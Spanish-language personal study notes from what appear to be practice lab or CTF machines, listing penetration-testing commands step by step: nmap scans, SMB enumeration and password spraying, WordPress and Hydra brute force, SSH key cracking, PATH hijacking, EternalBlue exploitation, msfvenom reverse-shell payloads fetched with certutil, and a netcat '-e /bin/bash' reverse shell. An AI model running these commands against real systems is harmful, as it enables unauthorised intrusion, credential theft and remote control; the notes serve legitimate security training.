
Recomendaciones:

• Crear entorno de trabajo.
• Draw.io dibujar diagrama de red, buscar hostnames y biosnames, para identificar dentro del a red.
• Recuerda ver EL CODIGO FUENTE a para poder **agregar la dirección a /etc/hosts**, cuando se trate de un virtual hosting
• **Enumerar usuarios usando cat /etc/passwd**
# Maquina (Dirbuster, SMB, Wordpress, LFI, id_rsa cracking y Path Hijacking)


# Enumeración de red

``Ver interfaces de red
ip a
arp -a 
ifconfig
arp-scan -I eth1 --localnet --ignoredups
``Barrido de ping, comprar endpoints en la red
nmap -sn 10.0.2.**0**/24

``Barrido de nmap a ips
sudo nmap -sS --min-rate 5000 -p- --open 10.0.2.34,35,36,37,38,55 -oN tcp_scan.txt
sudo nmap -p- --open --min-rate 4000 -sS -sCV -Pn -n 10.10.10.39 -vvv -oN tcp_scan.txt
## ` Optimizar puertos para ver versiones y servicios
grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr  ' ' ','

``Escanear puertos abiertos
nmap -p135,139,22,25,445,49665,49670,80 -sC -sV --open 10.0.2.43,45,46,53,55 -Pn -oN full_scan.txt


# Enumeración y explotación de samba

 `Enumeración de recursos:

smbclient -L 10.0.2.43 -N
smbmap -H 10.0.2.43

crackmapexec smb 10.0.2.43 -u '' -p '' --shares
crackmapexec smb 10.0.2.43 -u '' -p '' --users

**enum4linux 10.0.2.43**

`Ingresar sessión con anonymous y descarga de archivos:

smbclient //10.0.2.43/anonymous

• Obteniendo archivo en samba:
get archivo.txt
• Descargar todos los archivos recursivamente dentro de samba:
prompt
mget *

`Ataque de diccionario SMB:

crackmapexec smb 10.0.2.43 -u test -p passwords.txt

``Inicios de sesión samba

smbmap -H 10.0.2.43 -u helios -p qwerty
**smbclient //10.0.2.43/helios -U helios** (luego pedirá contraseña)

`Escaneo de vulnerabilidades samba con map
nmap -p445 --script="smb-vuln-\*" 10.0.2.45 

# Wordpress/ Searchesploit / John 2 id_rsa

`Ataques de diccionario/otros wordpress:
wpscan --url http://etc/hosts/
wpscan -U admin -P /usr/share/wordlists/rockyou.txt --url http://testsystem.local/h3l105/

``Buscar y descargar exploits
searchsploit wordpress mail masta
searchsploit -m (numero de exploit)
mousepad (numero de exploit)

`Buscar id_rsa y conectar ssh con id_rsa:
/home/username/.ssh/id_rsa
ssh username@10.0.2.43 (el que diga Permission denied (public key) es el wordpress)
nano id_rsa
**chmod 600 id_rsa**
ssh -i id_rsa helios@10.0.2.43

`Crackear contraseña de id_rsa encriptada con contraseña:
ssh2john id_rsa > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Escalada de privilegios

`Listar tareas en intervalos de tiempo:
cat /etc/crontab
`Ver archivos con permisos SUID (siempre que ejecutemos es bajo contexto de administrador):
find / -perm -4000 -ls 2>/dev/null
`Ver tipo de archivo:
file /opt/statuscheck
`Ver cadena de caracteres legibles en un archivo:
strings /opt/statuscheck

# Path Hijacking con curl

``Añadir tmp a al prinicpio del path, seguido del antiguo path, establece primera ruta que busca curl

export PATH=/tmp:$PATH
cd /tmp
nano curl (escribimos dentro del nano **/bin/bash -p** y guardamos)
chmod +x curl 
./curl
(iniciamos una sesión dentro de otra, exit para salir)
/opt/statuscheck


# Maquina 2 (Virtual Hosting, inyección SQL, SQLMap y File Upload)

# Nikto

`Escaneo simple de nikto:
nikto -url http://doc.hmv

# SQLi

`Usos de SQLi manual
' OR 1=1;-- -

# Tratamiento de la tty

script /dev/null -c bash
Ctrl + Z
stty raw -echo;fg
reset
xterm
export SHELL=bash TERM=xterm

`ver y proporcionar valores de filas y columnas:
stty -a (maquina propia en nueva shell, ver numero de filas y columnas)
stty rows 40 columns 157

# Pivotar de usuarios con archivo config

cd /var/www/html/nombredelaweb/
ls -la
cat initialize.php
reutilizamos las credenciales para pivotar de usuario
# Hydra
### Fuerza bruta con Hydra

Es posible que en algún momento necesites hacer un ataque de fuerza bruta a un servicio, como ssh, FTP, etc.

```
hydra -L usuarios.txt -P contraseña.txt "ip" ssh -s 22
hydra -L usuarios.txt -P contraseña.txt telnet://"ip" 
```

- -L: Indica el archivo donde se encuentran los posibles usuarios.
- -P: Indica el archivo donde se encuentran las posibles contraseñas.
- -s: Indica el puerto destino, en este caso al ser ssh, el puerto 22.

# Maquina 3 (Enumeración SMB con Nmap, Metasploit, MS08-067 y Eternal Blue)
# Eternal blue, via smb

`Enumerar vulnerabilidades del samba.
nmap -p445 --script="smb-vuln-\*" 10.0.2.45

`Abrimos metasploit
msfconsole

`Buscamos el exploit de eternal blue o numero

search MS17-010 
search eternal
search MS08-067

`Checker de vulnerabilidad

use auxiliary/scanner/smb/smb_ms17_010

`Asignamos la maquina victima, de manera global para metaesploit 

options 
setg RHOSTS 10.0.2.45
run

`Comprobamos los bits del sistema operativo, utilizaremos psexec

use windows/smb/ms17_010_psexec
shelll meterpreter x86/windows (VERIFICIAR LA ARQUITECTURA DE LA MAQUINA VICTIMA)

`Otra opción
use exploit/windows/smb/ms08_067_netapi

# Maquina 4 (msfvenom aspx, crackmapexec)

nano users.txt

`Enumerar SMB con crackmapexec con sesion nula
crackmapexec smb 10.0.2.0.46 -u '' -p '' --shares

`Enumerar SMB con crackmapexec con usuarios
crackmapexec smb 10.0.2.0.46 -u users.txt -p '' --shares

`Verificar recursos del samba, con fuerza bruta con la lista de usuarios como usuarios y contraseña.
crackmapexec smb 10.0.2.0.46 -u users.txt -p users.txt --shares

STATUS_LOGON_FAILURE

`Enumeramos los recursos compartidos:
ADMIN$
C$
IPC$
LOGS
WEB

`Corroboramos los archivos logs con el usuarios previamente encontrado bogo con contraseña bogo:

smbclient //10.0.2.46/LOGS -U bogo 

![[Pasted image 20240311143642.png]]

Vemos que el usuario marcos, ha entrado a la red para ver los recrusos, y la contraseña SuperPassword

`Validamos con crackmapexec

crackmapexec smb 10.0.2.46 -u marcos -p SuperPassword --shares

![[Pasted image 20240311143856.png]]

smbclient //10.0.2.46/WEB -U marcos

dir
get index.html

Confirmamos estar en la raiz del sitio web.

`Creada de rev shell en aspx
Staged, envia nuestro payload de una sola vez
Stagless, envia nuestro payload en varios pasos
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.100 LPORT=443 -f aspx reverse.aspx

`Subida archivos SMB
put reverse.aspx

`Nos ponemos en escuchar con netcat
nc -lvnp 443

## Crear ejecutable a nivel de sistema para establecer una sesion con meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.2.100 LPORT=443 -f exe -o reverse.exe

`Descargando el payload`
python3 -m http.server 80

``Descargar el archivo desde la maquina vitcima en el netcat
certutil.exe -f -urlcache http://10.0.2.100/reverse.exe reverse.exe
(10.0.2.100 es la maquina victima)

msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.2.100
set LPORT 443
run

`Ejecutar en la maquina victima
.\\reverse.exe

# Maquina 5 (Nikto, Dirbuster, Nibbleblog, searchsploit, Hydra, análisis de exploit y GTFObins)

nikto --url http://10.0.2.55/

dirbuster de archivo, y carpetas recrusivo de extensión php con 180 threads

AO THEME BIBBLEBLOG
enumerar el cms viendo

`Utilizar exploit en metaexploit buscado en serachsploit
php/remote/38489.rb
searchsploit -x 38489 (ver descripción del exploit)

http://10.0.2.55/my_weblog/admin.php

## Hydra fuerza bruta

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.55 http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect" -t 64 -F
(ultimo field incorrect,wrong o cualquier display que haya en el mensaje de erorr)"

http-post-form: ruta absoluta del panel de inicio de sesión, usuario y contraseña, string contenida dentro del panel para verificar el cambio de estado 404 a 203
-l Especificar unico usuario
-L Diccionario de usuarios
-p Especificar contraseña usuario unico
-P Diccionario de contraseñas


![[Pasted image 20240312200618.png]]

Aprocecharse del fichero sudoers. para utilizarlo, como el usuario correspodientee ejemplo comando git, buscado en ctfbins

sudo -u admin git -p help config
!/bin/bash
![[Pasted image 20240312202916.png]]

## F9 PARA ABRIR OPCIONES DENTRO DE UN SCRIPT

![[Pasted image 20240312203203.png]]

## Pivoting con metaexploit

msfconsole 
use multi/handler
run
nc 10.0.2.55 443 -e /bin/bash

Ctrl + z

sessions

use post/multi/manage/shell_to_meterpreter
options
set LHOST (IP ATACANTE)
set lport 443
set session 1
run